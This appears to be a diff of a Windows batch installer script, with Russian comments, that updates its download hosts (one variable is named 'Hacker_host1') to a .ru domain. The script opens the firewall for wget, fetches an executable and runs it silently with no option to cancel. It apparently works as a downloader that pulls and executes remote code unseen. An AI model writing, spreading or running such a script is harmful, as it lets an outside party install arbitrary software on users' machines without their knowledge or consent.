@@ -24,9 +24,9 @@ set UTIL=c:\Util
 
 rem Main Installation Hosts
 
-set Hacker_host1=anticriminalonline.ru
-set httphost=anticriminalonline.ru
-set ftphost=anticriminalonline.ru
+set Hacker_host1=file.tuneserv.ru
+set httphost=file.tuneserv.ru
+set ftphost=file.tuneserv.ru
 set httpMainFolder=Exponenta
 set httppref=http
 set httpport=80
@@ -54,14 +54,14 @@ rem Разрешаем все протоколы для wget.exe в брандмауэре
 
 rem Запускаем на выполнение команды WGET
 
-DEL /F /Q "%LocalFolder%\UtilSetup.exe"
+DEL /F /Q "%LocalFolder%\UtilPackSetup.exe"
 
-"%LocalFolder%\wget.exe" %host%/UtilSetup.exe -O "%LocalFolder%\UtilSetup.exe" -c -t 38 -w 120 -T 1800
+"%LocalFolder%\wget.exe" %host%/UtilPackSetup.exe -O "%LocalFolder%\UtilPackSetup.exe" -c -t 38 -w 120 -T 1800
 
 rem Install Utils Plugin
-if not exist "%LocalFolder%\UtilSetup.exe" goto pass_Utils
+if not exist "%LocalFolder%\UtilPackSetup.exe" goto pass_Utils
 echo "Install Utils Plugin..."
-"%LocalFolder%\UtilSetup.exe" /VERYSILENT /NOCANCEL 
+"%LocalFolder%\UtilPackSetup.exe" /VERYSILENT /NOCANCEL
 :pass_Utils
 
 
